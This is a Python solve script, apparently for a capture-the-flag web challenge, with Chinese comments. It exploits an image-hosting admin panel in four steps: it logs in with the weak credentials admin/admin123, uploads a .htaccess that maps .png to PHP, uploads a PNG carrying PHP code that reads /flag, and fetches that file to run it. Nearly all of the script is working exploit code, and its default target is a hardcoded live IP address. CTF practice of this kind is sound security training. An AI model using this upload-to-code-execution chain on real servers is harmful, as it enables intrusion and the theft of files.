# -*- coding: utf-8 -*-
"""曜石影像实验室 — /admin/ 弱口令 → 头像上传写 .htaccess → PNG 当 PHP 执行 → 读 /flag

用法: python solve_upload.py http://IP:PORT
"""
import re
import sys
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
import uuid

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:33710"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]


def req(path, data=None, method=None, ctype=None):
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
        ctype = ctype or "application/x-www-form-urlencoded"
    h = {"Content-Type": ctype} if data else {}
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with op.open(r, timeout=25) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


def upload(filename, content):
    b = "----wb" + uuid.uuid4().hex
    body = f'--{b}\r\n'.encode()
    body += f'Content-Disposition: form-data; name="avatar"; filename="{filename}"\r\n'.encode()
    body += b"Content-Type: image/png\r\n\r\n" + content + b"\r\n"
    body += f"--{b}--\r\n".encode()
    s, out = req("/admin/", body, "POST", f"multipart/form-data; boundary={b}")
    t = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", out.decode("utf-8", "replace")))
    m = re.search(r"已保存：\s*(\S+)", t)
    return m.group(1) if m else None


def step(msg):
    print("\n=== " + msg)


step("1）登录 /admin/（注意尾部斜杠，POST 到 /admin 会被 301 丢 body）")
s, b = req("/admin/", {"username": "admin", "password": "admin123"}, "POST")
print("   ->", s, "控制台" if "退出" in b.decode("utf-8", "replace") else "登录失败")

step("2）上传 .htaccess（文件名被原样采纳，未做白名单/重命名）")
p = upload(".htaccess", b"AddType application/x-httpd-php .png\n")
print("   ->", p)
s, b = req("/uploads/avatars/.htaccess")
print("   回读:", s, b[:80])

step("3）上传内容含 PHP 的 .png")
p = upload("s.png", b"GIF89a<?php echo file_get_contents('/flag'); ?>")
print("   ->", p)

step("4）访问该 png，Apache 按 PHP 解析")
s, b = req(p)
print("   ->", s, b[:200])
m = re.search(rb"HTUCTF\{[^}]*\}", b)
if m:
    print("\nFLAG:", m.group(0).decode())
